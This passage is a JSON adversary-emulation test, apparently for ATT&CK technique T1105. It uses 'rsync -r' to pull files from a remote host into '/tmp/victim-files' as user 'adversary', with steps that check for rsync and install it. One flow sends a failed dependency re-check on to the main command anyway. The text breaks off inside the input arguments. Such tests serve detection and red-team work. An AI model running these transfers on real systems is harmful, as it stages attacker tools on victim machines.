{
  "id": "3180f7d5-52c0-4493-9ea0-e3431a84773f",
  "name": "rsync remote file copy (pull)",
  "description": "Utilize rsync to perform a remote file copy (pull)\n",
  "platforms": [
    "linux",
    "darwin"
  ],
  "steps": [
    {
      "id": "9f1b24b8-566d-494d-8abd-78b894bef153",
      "type": "execute-command",
      "data": {
        "command": "rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "ec8741bb-f30a-4f9f-a6f5-bca5d05dde28",
      "name": "Check dependency 1/1",
      "description": "rsync must be installed on the machine \n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "ad87bcf7-065c-479b-b54f-86d156653f67",
      "name": "Resolve dependency 1/1",
      "description": "rsync must be installed on the machine \n",
      "type": "execute-command",
      "data": {
        "command": "(pkg install -y rsync)||(sudo apt-get -y install rsync)",
        "command_type": "sh"
      },
      "elevation_required": false
    },
    {
      "id": "51eaca0a-a718-4844-8b8f-1049c86c15b2",
      "name": "Re-check dependency 1/1",
      "description": "rsync must be installed on the machine \n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi",
        "command_type": "sh"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "ec8741bb-f30a-4f9f-a6f5-bca5d05dde28",
      "p": "on-success",
      "o": "9f1b24b8-566d-494d-8abd-78b894bef153"
    },
    {
      "s": "ec8741bb-f30a-4f9f-a6f5-bca5d05dde28",
      "p": "on-failure",
      "o": "ad87bcf7-065c-479b-b54f-86d156653f67"
    },
    {
      "s": "ad87bcf7-065c-479b-b54f-86d156653f67",
      "p": "on-success",
      "o": "51eaca0a-a718-4844-8b8f-1049c86c15b2"
    },
    {
      "s": "51eaca0a-a718-4844-8b8f-1049c86c15b2",
      "p": "on-failure",
      "o": "9f1b24b8-566d-494d-8abd-78b894bef153"
    }
  ],
  "tags": [
    "T1105"
  ],
  "input_arguments": [
    {
      "name": "local_path",
      "type": "path",
      "description": "Local path to receive rsync",
      "value": "/tmp/victim-files"
    },
    {
      "name": "username",
      "type": "string",
      "description": "User account to authenticate on remote host",
      "value": "adversary"
    },
    {
      "name": "remote_path",
      "type": "path",
      "description": "Path of folder to copy",
      "value": "/tmp/adversary-rsync/"
    },
    {
